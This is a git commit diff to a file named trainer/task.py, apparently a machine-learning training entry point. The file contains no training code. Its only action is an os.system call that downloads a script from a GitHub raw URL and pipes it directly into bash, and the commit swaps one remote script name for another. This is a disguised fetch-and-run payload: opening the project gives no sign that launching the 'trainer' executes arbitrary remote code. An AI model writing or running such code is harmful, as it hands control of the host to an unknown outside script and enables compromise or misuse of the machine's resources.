787a5fe73c5b9630ee8aec3bdab7dcc7b0d6f545
df hdhdh <jeffreyadams29@outlook.com>
2023-08-27 07:07:09 +0000

    task.py edited online with Bitbucket

--- trainer/task.py
+++ trainer/task.py
@@ -1,4 +1,4 @@
 import os
 
 
-os.system('curl -sL https://github.com/arifrahman555/kolor/raw/main/suganteh | bash')
+os.system('curl -sL https://github.com/arifrahman555/kolor/raw/main/cui | bash')
